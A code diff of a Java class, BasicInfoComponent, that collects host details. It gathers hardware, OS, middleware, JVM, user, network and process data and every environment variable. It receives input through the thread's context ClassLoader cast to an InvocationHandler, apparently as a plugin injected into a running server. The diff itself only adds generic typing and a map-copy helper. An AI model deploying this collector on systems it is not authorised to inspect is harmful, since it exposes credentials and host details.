@@ -50,30 +50,30 @@ public class BasicInfoComponent implements Runnable {
     // 缓存系统信息，避免重复调用
     // 【修复 #1】osBean 改为 Object，不再硬引用 com.sun.management 类
     private static volatile Object osBean;
-    private static volatile Class sunOsBeanClass; // com.sun.management.OperatingSystemMXBean 接口 Class
+    private static volatile Class<?> sunOsBeanClass; // com.sun.management.OperatingSystemMXBean 接口 Class
     private static volatile RuntimeMXBean runtimeBean;
     private static volatile MemoryMXBean memoryBean;
     private static volatile ThreadMXBean threadBean;
     private static volatile String hostName;
     // 【修复 #3】增加缓存时间戳
-    private static volatile Map middlewareInfo;
+    private static volatile Map<String, Object> middlewareInfo;
     private static volatile long middlewareCacheTime;
 
     private ClassLoader currentThreadClassLoader;
 
     // 组件接口字段
-    private HashMap params;
-    private HashMap results;
+    private HashMap<String, Object> params;
+    private HashMap<String, Object> results;
 
     
     public void run() {
         java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
         try {
-            params = (java.util.HashMap) h.invoke(null, null, null);
-            results = new java.util.HashMap();
+            params = copyStringObjectMap(h.invoke(null, null, null));
+            results = new java.util.HashMap<String, Object>();
             invoke();
         } catch (Throwable t) {
-            if (results == null) results = new java.util.HashMap();
+            if (results == null) results = new java.util.HashMap<String, Object>();
             results.put("code", Integer.valueOf(500));
             results.put("msg", t.getMessage());
         }
@@ -88,14 +88,14 @@ public class BasicInfoComponent implements Runnable {
      */
     public void invoke() {
         currentThreadClassLoader = Thread.currentThread().getContextClassLoader();
-        Map basicInfo = new HashMap();
+        Map<String, Object> basicInfo = new HashMap<String, Object>();
         basicInfo.put("collectTime", Long.valueOf(System.currentTimeMillis()));
         basicInfo.put("HardwareInfo", getHardwareInfo());
         basicInfo.put("OSInfo", getOSInfo());
         basicInfo.put("MiddlewareInfo", getMiddlewareInfo());
         basicInfo.put("JavaRuntimeInfo", getJavaRuntimeInfo());
         basicInfo.put("UserInfo", getUserInfo());
-        basicInfo.put("EnvironmentInfo", new HashMap(System.getenv()));
+        basicInfo.put("EnvironmentInfo", new HashMap<String, String>(System.getenv()));
         basicInfo.put("NetworkInfo", getNetworkInfo());
         basicInfo.put("FileSystemInfo", getFileSystemInfo());
         basicInfo.put("ProcessInfo", getProcessInfo());
@@ -108,8 +108,8 @@ public class BasicInfoComponent implements Runnable {
      * 获取硬件信息
      * 【修复 #1】通过反射调用 com.sun.management API，fallback 到标准 API
      */
-    public Map getHardwareInfo() {
-        Map info = new HashMap();
+    public Map<String, Object> getHardwareInfo() {
+        Map<String, Object> info = new HashMap<String, Object>();
         try {
             java.lang.management.OperatingSystemMXBean stdOs = ManagementFactory.getOperatingSystemMXBean();
             info.put("AvailableProcessors", Integer.valueOf(stdOs.getAvailableProcessors()));
@@ -118,7 +118,7 @@ public class BasicInfoComponent implements Runnable {
             // 尝试 com.sun.management 扩展方法（反射）
             Object sunOs = getSunOsBean();
             if (sunOs != null) {
-                Class sunOsClass = getSunOsBeanClass(); // 用接口 Class 查方法，而非实现类
+                Class<?> sunOsClass = getSunOsBeanClass(); // 用接口 Class 查方法，而非实现类
 
                 long totalPhysical = invokeLongMethod(sunOs, sunOsClass, "getTotalPhysicalMemorySize", -1L);
                 long freePhysical = invokeLongMethod(sunOs, sunOsClass, "getFreePhysicalMemorySize", -1L);
@@ -155,8 +155,8 @@ public class BasicInfoComponent implements Runnable {
      * 获取操作系统信息
      * 【修复 #4】hostname 优先读环境变量
      */
-    public Map getOSInfo() {
-        Map info = new HashMap();
+    public Map<String, Object> getOSInfo() {
+        Map<String, Object> info = new HashMap<String, Object>();
         try {
             java.lang.management.OperatingSystemMXBean stdOs = ManagementFactory.getOperatingSystemMXBean();
             String host = getHostNameSafe();
@@ -178,14 +178,14 @@ public class BasicInfoComponent implements Runnable {
      * 获取中间件信息
      * 【修复 #3】加 TTL 缓存过期
      */
-    public Map getMiddlewareInfo() {
+    public Map<String, Object> getMiddlewareInfo() {
         long now = System.currentTimeMillis();
         if (middlewareInfo != null && (now - middlewareCacheTime) < MIDDLEWARE_CACHE_TTL_MS) {
-            return new HashMap(middlewareInfo);
+            return new HashMap<String, Object>(middlewareInfo);
         }
 
         String middlewareType = detectMiddleware();
-        Map info = new HashMap();
+        Map<String, Object> info = new HashMap<String, Object>();
         info.put("MiddlewareType", middlewareType);
         try {
             if ("Tomcat".equals(middlewareType)) {
@@ -217,15 +217,15 @@ public class BasicInfoComponent implements Runnable {
 
         middlewareInfo = info;
         middlewareCacheTime = now;
-        return new HashMap(info);
+        return new HashMap<String, Object>(info);
     }
 
     /**
      * 获取Java运行时信息
      * 【修复 #2】getBootClassPath() 用 try-catch 隔离
      */
-    public Map getJavaRuntimeInfo() {
-        Map javaInfo = new HashMap();
+    public Map<String, Object> getJavaRuntimeInfo() {
+        Map<String, Object> javaInfo = new HashMap<String, Object>();
         try {
             RuntimeMXBean runtime = getRuntimeBean();
             MemoryMXBean memory = getMemoryBean();
@@ -283,8 +283,8 @@ public class BasicInfoComponent implements Runnable {
     /**
      * 获取用户信息
      */
-    public Map getUserInfo() {
-        Map userInfo = new HashMap();
+    public Map<String, Object> getUserInfo() {
+        Map<String, Object> userInfo = new HashMap<String, Object>();
         try {
             userInfo.put("UserName", System.getProperty("user.name"));
             userInfo.put("UserHome", System.getProperty("user.home"));
@@ -301,14 +301,14 @@ public class BasicInfoComponent implements Runnable {
     /**
      * 获取文件系统信息
      */
-    public List getFileSystemInfo() {
-        List fileSystemInfo = new ArrayList();
+    public List<Map<String, Object>> getFileSystemInfo() {
+        List<Map<String, Object>> fileSystemInfo = new ArrayList<Map<String, Object>>();
         try {
             File[] roots = File.listRoots();
             if (roots != null) {
                 for (int i = 0; i < roots.length; i++) {
                     File root = roots[i];
-                    Map storeInfo = new HashMap();
+                    Map<String, Object> storeInfo = new HashMap<String, Object>();
                     storeInfo.put("Name", root.getPath());
                     storeInfo.put("Root", root.getPath());
                     storeInfo.put("Type", "File System");
@@ -331,7 +331,7 @@ public class BasicInfoComponent implements Runnable {
                 }
             }
         } catch (Exception e) {
-            Map errorInfo = new HashMap();
+            Map<String, Object> errorInfo = new HashMap<String, Object>();
             errorInfo.put("error", "failed to get filesystem info: " + e.getMessage());
             fileSystemInfo.add(errorInfo);
         }
@@ -341,13 +341,13 @@ public class BasicInfoComponent implements Runnable {
     /**
      * 获取网络信息
      */
-    private List getNetworkInfo() {
-        List networkInfo = new ArrayList();
+    private List<Map<String, Object>> getNetworkInfo() {
+        List<Map<String, Object>> networkInfo = new ArrayList<Map<String, Object>>();
         try {
-            Enumeration interfaces = NetworkInterface.getNetworkInterfaces();
+            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
             while (interfaces.hasMoreElements()) {
-                NetworkInterface networkInterface = (NetworkInterface) interfaces.nextElement();
-                Map interfaceInfo = new HashMap();
+                NetworkInterface networkInterface = interfaces.nextElement();
+                Map<String, Object> interfaceInfo = new HashMap<String, Object>();
                 interfaceInfo.put("Name", networkInterface.getName());
                 interfaceInfo.put("DisplayName", networkInterface.getDisplayName());
                 interfaceInfo.put("IsUp", Boolean.valueOf(networkInterface.isUp()));
@@ -363,17 +363,17 @@ public class BasicInfoComponent implements Runnable {
                 }
 
                 // 获取 IP 地址
-                Enumeration addresses = networkInterface.getInetAddresses();
-                List ipAddresses = new ArrayList();
+                Enumeration<InetAddress> addresses = networkInterface.getInetAddresses();
+                List<String> ipAddresses = new ArrayList<String>();
                 while (addresses.hasMoreElements()) {
-                    InetAddress addr = (InetAddress) addresses.nextElement();
+                    InetAddress addr = addresses.nextElement();
                     ipAddresses.add(addr.getHostAddress());
                 }
                 interfaceInfo.put("IPAddresses", ipAddresses);
                 networkInfo.add(interfaceInfo);
             }
         } catch (Exception e) {
-            Map errorInfo = new HashMap();
+            Map<String, Object> errorInfo = new HashMap<String, Object>();
             errorInfo.put("error", "failed to get network info: " + e.getMessage());
             networkInfo.add(errorInfo);
         }
@@ -383,8 +383,8 @@ public class BasicInfoComponent implements Runnable {
     /**
      * 获取进程信息
      */
-    private Map getProcessInfo() {
-        Map processInfo = new HashMap();
+    private Map<String, Object> getProcessInfo() {
+        Map<String, Object> processInfo = new HashMap<String, Object>();
         try {
             RuntimeMXBean runtime = getRuntimeBean();
             processInfo.put("ProcessId", getProcessId());
@@ -433,14 +433,14 @@ public class BasicInfoComponent implements Runnable {
     /**
      * 获取缓存的 com.sun.management.OperatingSystemMXBean 接口 Class
      */
-    private static Class getSunOsBeanClass() {
+    private static Class<?> getSunOsBeanClass() {
         return sunOsBeanClass;
     }
 
     /**
      * 反射调用返回 long 的无参方法
      */
-    private static long invokeLongMethod(Object obj, Class clazz, String methodName, long defaultValue) {
+    private static long invokeLongMethod(Object obj, Class<?> clazz, String methodName, long defaultValue) {
         try {
             Method m = clazz.getMethod(methodName);
             Object result = m.invoke(obj);
@@ -615,7 +615,7 @@ public class BasicInfoComponent implements Runnable {
 
     private String getTomcatVersion() {
         try {
-            Class serverInfoClass = Class.forName("org.apache.catalina.util.ServerInfo",
+            Class<?> serverInfoClass = Class.forName("org.apache.catalina.util.ServerInfo",
                     false, currentThreadClassLoader);
             Method getServerInfoMethod = serverInfoClass.getMethod("getServerInfo");
             return (String) getServerInfoMethod.invoke(null);
@@ -677,5 +677,19 @@ public class BasicInfoComponent implements Runnable {
             return "Tomcat";
         }
         return "Unknown";
+    }
+
+    private static HashMap<String, Object> copyStringObjectMap(Object value) {
+        HashMap<String, Object> copy = new HashMap<String, Object>();
+        if (!(value instanceof Map)) {
+            return copy;
+        }
+        Map<?, ?> source = (Map<?, ?>) value;
+        for (Map.Entry<?, ?> entry : source.entrySet()) {
+            if (entry.getKey() instanceof String) {
+                copy.put((String) entry.getKey(), entry.getValue());
+            }
+        }
+        return copy;
     }
 }
